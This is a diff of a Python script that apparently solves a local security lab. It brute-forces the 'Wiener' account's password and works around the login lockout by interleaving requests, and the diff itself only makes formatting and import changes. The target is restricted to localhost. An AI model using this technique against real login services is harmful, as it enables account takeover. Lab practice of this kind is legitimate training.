@@ -1,6 +1,3 @@
-import json
-from http import HTTPStatus
-
 import requests
 import re
 from typing import Callable
@@ -9,7 +6,6 @@ from rich.console import Console
 from rich.progress import Progress
 from lxml import html
 from rich import print
-from rich.panel import Panel
 
 from valid8 import validate
 
@@ -27,7 +23,7 @@ def get_password():
 
 def check_login_blocked(response):
     error = "You're blocked. Please try again in 1 minute"
-    if  error in str(response.content):
+    if error in str(response.content):
         raise Exception(error)
 
 
@@ -37,7 +33,8 @@ def login(server):
     index = 1
     found = False
     with Progress() as progress:
-        task = progress.add_task("[bold yellow]Try to access to Wiener account and discovering password...", total=len(passwords))
+        task = progress.add_task("[bold yellow]Try to access to Wiener account and discovering password...",
+                                 total=len(passwords))
         while len(passwords) > 0:
             if index % 4 == 0 or index == 1:
                 response = requests.post(f"{server}/home/login", json={
@@ -52,7 +49,7 @@ def login(server):
                 })
                 progress.update(task, advance=1)
                 check_login_blocked(response)
-                if len(response.content)==14 and len(passwords) > 0:
+                if len(response.content) == 14 and len(passwords) > 0:
                     progress.update(task_id=task, description="[bold green]Password found", advance=len(passwords))
                     found = True
                     break
@@ -61,9 +58,6 @@ def login(server):
         print("The password of Wiener is: " + current_password)
     else:
         print("Password not found!")
-
-   
-
 
 
 def pattern(regex: str) -> Callable[[str], bool]:
@@ -79,7 +73,6 @@ def pattern(regex: str) -> Callable[[str], bool]:
 def validate_server(server):
     validate("server", server, custom=[pattern(r'\w{4,5}:\/\/(localhost|127.0.0.1):8082$')],
              help_msg="Insert a valid localhost URL")
-
 
 
 def is_lab_solved(server):
@@ -99,7 +92,6 @@ def main(
         )
 ):
     validate_server(server)
-
     login(server)
 
 
